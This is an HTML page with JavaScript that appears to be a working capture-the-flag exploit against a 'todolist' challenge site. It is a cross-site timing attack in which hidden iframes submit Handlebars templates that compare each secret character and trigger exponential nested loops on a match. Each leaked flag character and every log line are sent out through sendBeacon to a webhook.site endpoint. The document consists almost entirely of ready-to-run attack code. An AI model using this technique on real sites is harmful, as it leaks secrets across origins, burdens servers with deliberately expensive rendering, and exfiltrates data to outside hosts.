<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>.</title></head><body>
<pre id="log"></pre>
<script>
// ── CONFIG ────────────────────────────────────────────────────────────────────
const TARGET  = "https://todolist.challs.srdnlen.it";
const WEBHOOK = "https://webhook.site/591468f2-6ec6-4310-a0b1-0837b7ef0608";
const PREFIX  = "srdnlen{leakycs";
const CHARSET = "abcdefghijklmnopqrstuvwxyz_0123456789}";
const ARRLEN  = 11;
const DEPTH   = 7;
const P_TO    = 3000;   // ms per parallel batch
const BUDGET  = 52000;  // ms total
// ─────────────────────────────────────────────────────────────────────────────

const ARR  = JSON.stringify(Array.from({length:ARRLEN},(_,i)=>i));
const OPEN = "{{#each @root.arr}}".repeat(DEPTH);
const CLOS = "{{/each}}".repeat(DEPTH);

const logEl = document.getElementById("log");
function print(msg) {
  logEl.textContent += msg + "\n";
  navigator.sendBeacon(`${WEBHOOK}?log=${encodeURIComponent(msg)}`);
}

function makeUrl(pos, ch) {
  const tpl = `{{#if (eq (lookup secret ${pos}) "${ch}")}}${OPEN}X${CLOS}{{/if}}`;
  return TARGET + "/?data=" + encodeURIComponent(`{"arr":${ARR}}`)
       + "&template=" + encodeURIComponent(tpl);
}

const sleep = ms => new Promise(r => setTimeout(r, ms));

// Probe all chars in parallel — handles onload, onerror, and timeout
function probeAll(pos) {
  return new Promise(resolve => {
    const results = {};
    const chars   = CHARSET.split("");
    let remaining = chars.length;

    function finish(ch, dt, reason) {
      if (ch in results) return; // already resolved this char
      results[ch] = { dt, reason };
      if (--remaining === 0) resolve(results);
    }

    chars.forEach(ch => {
      const f  = document.createElement("iframe");
      f.style  = "width:1px;height:1px;position:fixed;top:-9999px;left:-9999px";
      const t0 = Date.now();

      // Timeout = still loading = MATCH (Handlebars is crunching 11^7 ops)
      const tid = setTimeout(() => {
        f.src = "about:blank";
        try { f.remove(); } catch(e) {}
        finish(ch, Date.now()-t0, "timeout");
      }, P_TO);

      // onload = loaded fast = no match
      f.onload = () => {
        clearTimeout(tid);
        try { f.remove(); } catch(e) {}
        finish(ch, Date.now()-t0, "load");
      };

      // onerror = X-Frame-Options block or network error
      // treat as fast (no match) — dt will be small
      f.onerror = () => {
        clearTimeout(tid);
        try { f.remove(); } catch(e) {}
        finish(ch, Date.now()-t0, "error");
      };

      f.src = makeUrl(pos, ch);
      document.body.appendChild(f);
    });
  });
}

// Solo verify a single char
function probeSolo(pos, ch) {
  return new Promise(resolve => {
    const f  = document.createElement("iframe");
    f.style  = "width:1px;height:1px;position:fixed;top:-9999px;left:-9999px";
    const t0 = Date.now();
    const tid = setTimeout(() => {
      f.src = "about:blank"; try{f.remove();}catch(e){}
      resolve({ dt: Date.now()-t0, reason: "timeout" });
    }, P_TO);
    f.onload  = () => { clearTimeout(tid); try{f.remove();}catch(e){} resolve({ dt:Date.now()-t0, reason:"load" }); };
    f.onerror = () => { clearTimeout(tid); try{f.remove();}catch(e){} resolve({ dt:Date.now()-t0, reason:"error" }); };
    f.src = makeUrl(pos, ch);
    document.body.appendChild(f);
  });
}

async function run() {
  const t0  = Date.now();
  let flag  = PREFIX;
  print(`[start] prefix=${flag} charset=${CHARSET} P_TO=${P_TO}ms`);

  // ── Sanity check: probe a known-false char solo ──────────────────────────
  print(`[sanity] probing pos=0 char='a' solo (should be fast)...`);
  const sanity = await probeSolo(0, "a");
  print(`[sanity] pos=0 char='a' dt=${sanity.dt}ms reason=${sanity.reason}`);
  if (sanity.reason === "error") {
    print(`[WARN] iframes are being blocked (X-Frame-Options)! Timing won't work.`);
    // Still continue — timing oracle via timeout may still work
  }
  // ────────────────────────────────────────────────────────────────────────

  for (let pos = PREFIX.length; pos < 60; pos++) {
    const elapsed = Date.now() - t0;
    if (elapsed > BUDGET) {
      print(`[budget] stopped at pos ${pos} after ${elapsed}ms`);
      break;
    }

    print(`[pos ${pos}] parallel scan... (${elapsed}ms elapsed)`);
    const results = await probeAll(pos);

    // Sort by dt descending
    const ranked = Object.entries(results)
      .map(([ch, r]) => ({ ch, dt: r.dt, reason: r.reason }))
      .sort((a, b) => b.dt - a.dt);

    const top5 = ranked.slice(0,5).map(r=>`'${r.ch}'=${r.dt}ms(${r.reason})`).join(" | ");
    print(`[pos ${pos}] top5: ${top5}`);

    // Count how many timed out
    const timedOut = ranked.filter(r => r.reason === "timeout");
    const errored  = ranked.filter(r => r.reason === "error");
    print(`[pos ${pos}] timed-out=${timedOut.length} errored=${errored.length} loaded=${ranked.length-timedOut.length-errored.length}`);

    let hitChar = null;

    if (timedOut.length === 1) {
      // Exactly one timeout = clean match
      hitChar = timedOut[0].ch;
      print(`[HIT-clean] pos=${pos} char='${hitChar}' (only timeout)`);
    } else if (timedOut.length > 1) {
      // Multiple timeouts = network congestion, verify each solo
      print(`[AMBIGUOUS] ${timedOut.length} timeouts — verifying solo...`);
      for (const r of timedOut) {
        const v = await probeSolo(pos, r.ch);
        print(`[VERIFY] pos=${pos} char='${r.ch}' solo=${v.dt}ms reason=${v.reason}`);
        if (v.reason === "timeout") {
          hitChar = r.ch;
          print(`[HIT-verified] pos=${pos} char='${hitChar}'`);
          break;
        }
      }
    } else if (timedOut.length === 0 && errored.length < CHARSET.length) {
      // Nothing timed out — use ratio heuristic on loaded ones
      const loaded = ranked.filter(r => r.reason === "load");
      if (loaded.length >= 2) {
        const best   = loaded[0];
        const second = loaded[1];
        const ratio  = best.dt / Math.max(1, second.dt);
        if (best.dt > 800 && ratio > 3.0) {
          print(`[HIT-ratio] pos=${pos} char='${best.ch}' ${best.dt}ms vs ${second.dt}ms ratio=${ratio.toFixed(1)}x`);
          hitChar = best.ch;
        }
      }
    }

    if (hitChar) {
      flag += hitChar;
      print(`[FLAG] ${flag}`);
      navigator.sendBeacon(`${WEBHOOK}?FLAG=${encodeURIComponent(flag)}`);
      if (hitChar === "}") break;
    } else {
      print(`[MISS] pos=${pos} — no confident match. Check sanity output above.`);
      navigator.sendBeacon(`${WEBHOOK}?MISS&pos=${pos}&flag=${encodeURIComponent(flag)}`);
      break;
    }
  }

  print(`[DONE] ${flag} total=${Date.now()-t0}ms`);
  navigator.sendBeacon(`${WEBHOOK}?DONE&flag=${encodeURIComponent(flag)}`);
}

run();
</script>
</body></html>
